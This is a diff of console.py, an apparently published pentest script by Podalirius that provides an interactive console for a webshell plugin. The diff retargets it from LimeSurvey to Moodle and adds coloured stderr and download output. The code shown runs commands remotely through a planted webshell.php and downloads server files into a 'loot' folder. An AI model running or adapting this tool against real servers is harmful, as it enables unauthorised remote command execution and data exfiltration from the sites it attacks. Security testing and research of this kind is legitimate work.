@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # File name          : console.py
 # Author             : Podalirius (@podalirius_)
-# Date created       : 16 Apr 2022
+# Date created       : 22 May 2022
 
 
 import argparse
@@ -38,8 +38,8 @@ readline.set_completer_delims('\n')
 
 
 def parseArgs():
-    parser = argparse.ArgumentParser(description="Interactive console for LimeSurvey webshell plugin")
-    parser.add_argument("-t", "--target", default=None, required=True, help='LimeSurvey target instance')
+    parser = argparse.ArgumentParser(description="Interactive console for Moodle webshell plugin")
+    parser.add_argument("-t", "--target", default=None, required=True, help='Moodle target instance')
     parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
     parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
     return parser.parse_args()
@@ -60,6 +60,10 @@ def remote_exec(target, cmd, verbose=False):
                 print(json.dumps(data, indent=4))
             if len(data["stdout"].strip()) != 0:
                 print(data["stdout"].strip())
+
+            if len(data["stderr"].strip()) != 0:
+                for line in data["stderr"].strip().split('\n'):
+                    print("\x1b[91m%s\x1b[0m" % line)
     except Exception as e:
         print(e)
 
@@ -71,7 +75,7 @@ def remote_download(target, remote_path, local_path="./loot/"):
         for k in range(len(units)):
             if l < (1024 ** (k + 1)):
                 break
-        return "%4.2f %s" % (round(l / (1024 ** (k)), 2), units[k])
+        return "%4.2f %s" % (round(l / (1024 ** k), 2), units[k])
     #
     r = requests.post(
         "%s/upload/plugins/WebShell/webshell.php" % target,
@@ -82,6 +86,7 @@ def remote_download(target, remote_path, local_path="./loot/"):
     )
 
     if r.status_code == 200:
+        print('\x1b[92m[+] (%9s) %s\x1b[0m' % (b_filesize(r.content), remote_path))
         dir = local_path + os.path.dirname(remote_path)
         if not os.path.exists(dir):
             os.makedirs(dir, exist_ok=True)
